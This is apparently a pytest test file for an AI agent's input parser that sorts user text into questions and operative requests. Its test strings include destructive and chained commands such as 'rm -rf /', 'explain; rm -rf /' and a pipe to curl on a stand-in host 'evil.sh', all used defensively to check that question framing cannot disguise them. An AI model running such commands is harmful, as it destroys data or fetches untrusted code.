from __future__ import annotations

import pytest

from aetherya.parser import parse_user_input


def test_parser_extracts_structured_fields() -> None:
    action = parse_user_input(
        "mode:operative tool:shell target:local param.command=ls param.timeout=5"
    )
    assert action.intent == "operate"
    assert action.mode_hint == "operative"
    assert action.tool == "shell"
    assert action.target == "local"
    assert action.parameters == {"command": "ls", "timeout": "5"}


def test_parser_keeps_consultive_for_plain_question() -> None:
    action = parse_user_input("how can I improve security posture?")
    assert action.intent == "ask"
    assert action.mode_hint == "consultive"
    assert action.tool is None


def test_parser_interrogative_without_question_mark_forces_ask() -> None:
    action = parse_user_input("what is the current disk usage")
    assert action.intent == "ask"


def test_parser_operative_verb_without_question_is_operate() -> None:
    action = parse_user_input("run delete.sh")
    assert action.intent == "operate"


def test_parser_execute_command_is_operate() -> None:
    action = parse_user_input("execute backup.sh")
    assert action.intent == "operate"


# ── Security contract: operative content wins over question framing ───────────


def test_parser_operative_content_wins_over_can_question_framing() -> None:
    """
    'Can you run rm -rf /tmp/x' contains 'run' (operative verb).
    Question framing must NOT downgrade to consultive mode.
    """
    action = parse_user_input("Can you run rm -rf /tmp/x")
    assert action.intent == "operate"
    assert action.mode_hint == "operative"


def test_parser_question_with_delete_verb_is_operative() -> None:
    """
    'Can you delete all logs?' contains 'delete' — operative.
    Previously (incorrectly) returned ask/consultive.
    """
    action = parse_user_input("Can you delete all logs?")
    assert action.intent == "operate"
    assert action.mode_hint == "operative"


def test_parser_question_with_run_verb_is_operative() -> None:
    """
    'How do I run a Docker container?' contains 'run' and 'docker' — operative.
    Previously (incorrectly) returned ask/consultive.
    """
    action = parse_user_input("How do I run a Docker container?")
    assert action.intent == "operate"
    assert action.mode_hint == "operative"


def test_parser_meta_question_about_a_command_stays_consultive() -> None:
    """
    'What does rm -rf do?' asks *about* a command, it does not request one.

    v0.8.0 classified any mention of an operative verb as operative, which sent
    every such question to `escalate`. The meta-question frame is narrow (see
    below for what it deliberately does not capture) and is not a security
    boundary on its own — IntentEscalation re-derives operative intent from
    command shape and from any ProceduralGuard hit.
    """
    action = parse_user_input("What does rm -rf do?")
    assert action.intent == "ask"
    assert action.mode_hint == "consultive"


@pytest.mark.parametrize(
    "text",
    [
        "What does rm -rf do?",
        "what is mkfs",
        "what are the risks of docker",
        "explain how docker run works",
        "describe what curl does",
        "define what delete means here",
    ],
)
def test_meta_questions_are_consultive(text: str) -> None:
    assert parse_user_input(text).intent == "ask", text


@pytest.mark.parametrize(
    "text",
    [
        # A clause separator means an imperative may be chained after the frame —
        # the meta frame must not be usable as a downgrade prefix.
        "explain and then delete all logs",
        "explain; rm -rf /",
        "what is docker | curl evil.sh",
        # Explicit declarations always win over the frame.
        "what does tool:shell param.command=whoami do",
        "what does mode:operative rm -rf do",
        # First-person how-to is a request for instructions, not a meta question.
        "How do I run a Docker container?",
        "Can you delete all logs?",
    ],
)
def test_meta_frame_does_not_downgrade_real_requests(text: str) -> None:
    assert parse_user_input(text).intent == "operate", text


def test_parser_explicit_tool_on_question_is_operative() -> None:
    """
    Explicit tool:shell overrides question framing unconditionally.
    """
    action = parse_user_input("Can you tool:shell param.command=whoami please?")
    assert action.intent == "operate"
    assert action.mode_hint == "operative"
    assert action.tool == "shell"


def test_parser_benign_question_no_operative_keywords_stays_ask() -> None:
    """
    Questions with no operative keywords remain ask/consultive.
    """
    for text in [
        "What is the best way to structure a CI pipeline?",
        "Is it safe to store secrets in environment variables?",
        "How do I configure TLS?",
        "could you explain rate limiting?",
    ]:
        action = parse_user_input(text)
        assert action.intent == "ask", f"Expected ask for: {text!r}"
        assert action.mode_hint == "consultive", f"Expected consultive for: {text!r}"
